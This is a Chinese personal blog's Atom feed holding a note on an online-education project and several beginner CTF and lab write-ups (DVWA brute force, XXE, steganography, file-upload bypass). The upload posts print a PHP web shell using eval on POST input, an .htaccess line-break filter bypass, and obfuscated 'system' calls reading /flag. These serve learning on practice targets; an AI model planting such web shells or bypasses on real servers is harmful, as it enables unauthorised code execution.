<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://crlrlc.github.io/</id>
    <title>Gridea</title>
    <updated>2023-06-20T08:55:25.841Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://crlrlc.github.io/"/>
    <link rel="self" href="https://crlrlc.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://crlrlc.github.io/images/avatar.png</logo>
    <icon>https://crlrlc.github.io/favicon.ico</icon>
    <rights>All rights reserved 2023, Gridea</rights>
    <entry>
        <title type="html"><![CDATA[Day201.项目起步、MyBatisPlus 谷粒学院]]></title>
        <id>https://crlrlc.github.io/post/day201xiang-mu-qi-bu-mybatisplus-gu-li-xue-yuan/</id>
        <link href="https://crlrlc.github.io/post/day201xiang-mu-qi-bu-mybatisplus-gu-li-xue-yuan/">
        </link>
        <updated>2023-04-02T07:17:58.000Z</updated>
        <content type="html"><![CDATA[<h1 id="在线教育项目">在线教育项目</h1>
<h2 id="一-起步">一、起步</h2>
<h3 id="1-项目采用的商业模式">1、项目采用的商业模式</h3>
<p>B2C模式（Business To Customer 会员模式）：<em>此项目采用B2C</em><br>
<img src="https://crlrlc.github.io//post-images/1687246390829.png" alt="" loading="lazy"></p>
<h3 id="2-项目采用的功能模块">2、项目采用的功能模块</h3>
<figure data-type="image" tabindex="1"><img src="https://crlrlc.github.io//post-images/1687246501306.jpg" alt="" loading="lazy"></figure>
<h3 id="3-项目中采用的技术">3、项目中采用的技术</h3>
<figure data-type="image" tabindex="2"><img src="https://crlrlc.github.io//post-images/1687246576838.jpg" alt="" loading="lazy"></figure>
<h2 id="二-在线教育项目简介">二、在线教育项目简介</h2>
<h3 id="1-功能简介">1、功能简介</h3>
<p>在线教育项目，是一个B2C模式的职业技能在线教育系统，分为前台用户系统和后台运营平台。</p>
<h3 id="2-系统模块">2、系统模块</h3>
<figure data-type="image" tabindex="3"><img src="https://crlrlc.github.io//post-images/1687246777750.png" alt="" loading="lazy"></figure>
<h2 id="三-系统架构">三、系统架构</h2>
<figure data-type="image" tabindex="4"><img src="https://crlrlc.github.io//post-images/1687247176422.png" alt="" loading="lazy"></figure>
<h2 id="四-前后端分离概念">四、前后端分离概念</h2>
<figure data-type="image" tabindex="5"><img src="https://crlrlc.github.io//post-images/1687250827938.jpg" alt="" loading="lazy"></figure>
<h1 id="开发讲师管理模块后端">开发讲师管理模块后端</h1>
<h2 id="一-数据库设计">一、数据库设计</h2>
<h3 id="数据库">数据库</h3>
<p>guli</p>
<h3 id="数据表">数据表</h3>
<p><code>CREATE TABLE</code>edu_teacher<code>(</code>id<code>char(19) NOT NULL COMMENT '讲师ID',</code>name<code>varchar(20) NOT NULL COMMENT '讲师姓名',</code>intro<code>varchar(500) NOT NULL DEFAULT '' COMMENT '讲师简介',</code>career<code>varchar(500) DEFAULT NULL COMMENT '讲师资历,一句话说明讲师',</code>level<code>int(10) unsigned NOT NULL COMMENT '头衔 1高级讲师 2首席讲师',</code>avatar<code>varchar(255) DEFAULT NULL COMMENT '讲师头像',</code>sort<code>int(10) unsigned NOT NULL DEFAULT '0' COMMENT '排序',</code>is_deleted<code>tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '逻辑删除 1（true）已删除， 0（false）未删除',</code>gmt_create<code>datetime NOT NULL COMMENT '创建时间',</code>gmt_modified<code>datetime NOT NULL COMMENT '更新时间', PRIMARY KEY (</code>id<code>), UNIQUE KEY</code>uk_name<code>(</code>name<code>) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='讲师';</code></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[用burpsuit进行暴力破解]]></title>
        <id>https://crlrlc.github.io/post/yong-burpsuit-jin-xing-bao-li-po-jie/</id>
        <link href="https://crlrlc.github.io/post/yong-burpsuit-jin-xing-bao-li-po-jie/">
        </link>
        <updated>2021-01-27T02:16:07.000Z</updated>
        <content type="html"><![CDATA[<p>用到的软件：burpsuit。目标网站：本机上的dvwa靶场<br>
1、首先在网站上下载dvwa，网址：http://dvwa.co.uk，若网站打不开，可以去GitHub上下载<br>
2、把得到的压缩包解压出来并复制到php集成开发环境上<br>
<img src="https://crlrlc.github.io//post-images/1611717077760.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717095963.png" alt="" loading="lazy"></p>
<p>3、这里有一点要注意的是，dvwa中的config需要设置一下：<br>
<img src="https://crlrlc.github.io//post-images/1611717116751.png" alt="" loading="lazy"></p>
<p>4、这时候在网页上输入：“127.0.0.1/dvwa就可以到靶场上了”，需要注意的是第一次进靶场是需要用户名和密码的，密码分别是“admin”，“password”<br>
<img src="https://crlrlc.github.io//post-images/1611717141056.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717167459.png" alt="" loading="lazy"></p>
<p>5、开始破解<br>
<img src="https://crlrlc.github.io//post-images/1611717227839.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717248515.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717263885.png" alt="" loading="lazy"><br>
1）这里需要注意一些问题<br>
<img src="https://crlrlc.github.io//post-images/1611717299210.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717311414.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717335712.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717366931.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717387838.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717462449.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717470236.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717476885.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[老烟枪]]></title>
        <id>https://crlrlc.github.io/post/lao-yan-qiang/</id>
        <link href="https://crlrlc.github.io/post/lao-yan-qiang/">
        </link>
        <updated>2020-12-23T12:06:12.000Z</updated>
        <content type="html"><![CDATA[<p>1、打开题目，发现与之前不同的是它不在给出网站了，而是给出压缩包<br>
<img src="https://crlrlc.github.io//post-images/1608725278266.png" alt="" loading="lazy"><br>
2、解压出来后发现是图片：<br>
<img src="https://crlrlc.github.io//post-images/1608725342984.jpg" alt="" loading="lazy"><br>
3、于是我们打开kali虚拟机，（kali其实是Linux系统的一个版本，里边附带了很多渗透测试的工具），并把图片拖进去，并打开终端输入如图所示的一些指令：<br>
<img src="https://crlrlc.github.io//post-images/1608725761265.png" alt="" loading="lazy"><br>
4、打开文件夹，我们可以得到flag，他是倒过来的，如图所示：<br>
<img src="https://crlrlc.github.io//post-images/1608725899561.png" alt="" loading="lazy"><br>
5、我们试着把他拖出来：<br>
<img src="https://crlrlc.github.io//post-images/1608726017021.png" alt="" loading="lazy"><br>
6、如图：<br>
<img src="https://crlrlc.github.io//post-images/1608726052428.png" alt="" loading="lazy"><br>
反转处理后：<br>
<img src="https://crlrlc.github.io//post-images/1608726139656.png" alt="" loading="lazy"><br>
7、任务完成！</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[神奇的登录框]]></title>
        <id>https://crlrlc.github.io/post/shen-qi-de-deng-lu-kuang/</id>
        <link href="https://crlrlc.github.io/post/shen-qi-de-deng-lu-kuang/">
        </link>
        <updated>2020-11-25T11:37:56.000Z</updated>
        <content type="html"><![CDATA[<p>1、打开题目，得到一个登录窗<br>
<img src="https://crlrlc.github.io//post-images/1606304463434.png" alt="" loading="lazy"><br>
2、把一个神奇的指令输进去并按下查询键：<br>
<img src="https://crlrlc.github.io//post-images/1606304577387.png" alt="" loading="lazy"><br>
3、可以发现页面并没有发生变化，但是我们在网址上输一个1.txt进去：<br>
<img src="https://crlrlc.github.io//post-images/1606304836043.png" alt="" loading="lazy"><br>
4、接下来返回到登录窗，输入一个指令并点击查询，如图所示：<br>
<img src="https://crlrlc.github.io//post-images/1606305133537.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1606305184429.png" alt="" loading="lazy"><br>
5、可以发现页面虽然并没有什么变化，不过和刚刚一样，在网址栏输入/2.txt，就可以得到flag了：<br>
<img src="https://crlrlc.github.io//post-images/1606305311522.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Who are you?]]></title>
        <id>https://crlrlc.github.io/post/who-are-you/</id>
        <link href="https://crlrlc.github.io/post/who-are-you/">
        </link>
        <updated>2020-11-25T11:21:57.000Z</updated>
        <content type="html"><![CDATA[<p>1、打开题目发现这个玩意：<br>
<img src="https://crlrlc.github.io//post-images/1606303752487.png" alt="" loading="lazy"><br>
2、打开burpsuit并把得到的东西发到重发器上并加上xxe：<br>
<img src="https://crlrlc.github.io//post-images/1606303852167.png" alt="" loading="lazy"><br>
3、发送后得到这个东西：<br>
<img src="https://crlrlc.github.io//post-images/1606303963668.png" alt="" loading="lazy"><br>
4、再把得到的一大串字母copy到解码器上用bese64解码一下得到flag：<br>
<img src="https://crlrlc.github.io//post-images/1606304117036.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[G2mtu学生?]]></title>
        <id>https://crlrlc.github.io/post/g2mtu-xue-sheng/</id>
        <link href="https://crlrlc.github.io/post/g2mtu-xue-sheng/">
        </link>
        <updated>2020-11-25T10:34:15.000Z</updated>
        <content type="html"><![CDATA[<p>1、打开题目，发现这样一个东西：<br>
<img src="https://crlrlc.github.io//post-images/1606300573295.png" alt="" loading="lazy"><br>
2、打开burpsuit发现这样的东西<br>
<img src="https://crlrlc.github.io//post-images/1606300665780.png" alt="" loading="lazy"><br>
3、把拦截的东西发到重发器上：<br>
<img src="https://crlrlc.github.io//post-images/1606300868908.png" alt="" loading="lazy"><br>
4、最终得到flag文件：<br>
<img src="https://crlrlc.github.io//post-images/1606300943423.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[力口做题]]></title>
        <id>https://crlrlc.github.io/post/li-kou-zuo-ti/</id>
        <link href="https://crlrlc.github.io/post/li-kou-zuo-ti/">
        </link>
        <updated>2020-11-20T15:15:26.000Z</updated>
        <content type="html"><![CDATA[<p>题目如下：<br>
<img src="https://crlrlc.github.io//post-images/1605885416449.png" alt="" loading="lazy"><br>
结果：<br>
太菜了，做不出来，只能看答案😰<br>
答案如下：<br>
<img src="https://crlrlc.github.io//post-images/1605885468484.png" alt="" loading="lazy"><br>
心得：<br>
整体思路：创建一个新的动态数组与原数组相对应，并利用if的结构为手段来把空格字符代替成%20来达到目的<br>
答案的流程：<br>
1、创建动态数组；<br>
2、将新数组与原数组相对应，并把‘ ’代替成%20，这就是新数组的长度是原数组的3倍的原因。因为字符数组最后有\0,所以length*3再+1.</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[unserialize4]]></title>
        <id>https://crlrlc.github.io/post/unserialize4/</id>
        <link href="https://crlrlc.github.io/post/unserialize4/">
        </link>
        <updated>2020-11-08T03:26:54.000Z</updated>
        <content type="html"><![CDATA[<p>##写在前面：<br>
又是在大佬的帮助下，我又学会了一道题😂，突然发现所有的靶没有一个是我自己独立解决的😂，下面是步骤<br>
##过程：<br>
<img src="https://crlrlc.github.io//post-images/1604806928412.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604806935375.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604806941149.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604806947382.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604806951798.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[第四次打靶]]></title>
        <id>https://crlrlc.github.io/post/di-si-ci-da-ba/</id>
        <link href="https://crlrlc.github.io/post/di-si-ci-da-ba/">
        </link>
        <updated>2020-10-31T15:05:26.000Z</updated>
        <content type="html"><![CDATA[<p>##在师兄的指导下，我进行了底四次靶场实验下面是步骤<br>
<img src="https://crlrlc.github.io//post-images/1604156810423.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604156815676.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604156820417.png" alt="" loading="lazy"><br>
##补充<br>
upload3那题我失败了，原因是.htaccess没有双写，只是双写了1.aaa中的木马，<br>
<img src="https://crlrlc.github.io//post-images/1604157027025.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604157109287.png" alt="" loading="lazy"><br>
此外，我还知道了一个不用蚁剑的办法：<br>
1.aaa<br>
可以是<br>
&lt;?pphphp<br>
echo <code>cat /flag</code>;</p>
<pre><code>也可以是
&lt;  ?pphphp
$a = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
$a('cat /flag');

这两个方法就直接访问就行了，不需要用蚁剑   </code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[3,upload6]]></title>
        <id>https://crlrlc.github.io/post/3upload6/</id>
        <link href="https://crlrlc.github.io/post/3upload6/">
        </link>
        <updated>2020-10-29T09:30:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="htaccess文件换行绕过">.htaccess文件换行绕过</h3>
<p>上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。</p>
<p>.htaccess支持换行编写所以使用换行可以直接上传成功并解析。</p>
<ul>
<li>题目</li>
</ul>
<p>upload6</p>
<ul>
<li>
<p>过滤掉application，则使用换行绕过</p>
</li>
<li>
<p>.htaccess</p>
</li>
</ul>
<pre><code>AddType application/x-httpd-php .aaa
</code></pre>
<p>提示：内容不能有application</p>
<p>尝试使用.htaccess文件换行绕过。</p>
<ul>
<li>.htaccess</li>
</ul>
<pre><code>AddType appli\
cation/x-httpd-php .aaa
</code></pre>
<ul>
<li>1.aaa</li>
</ul>
<pre><code>&lt;?php
@eval($_POST['cmd']);
</code></pre>
<p>##步骤如下：<br>
<img src="https://crlrlc.github.io//post-images/1603964256264.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603964263023.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603964269523.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603964275363.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
</feed>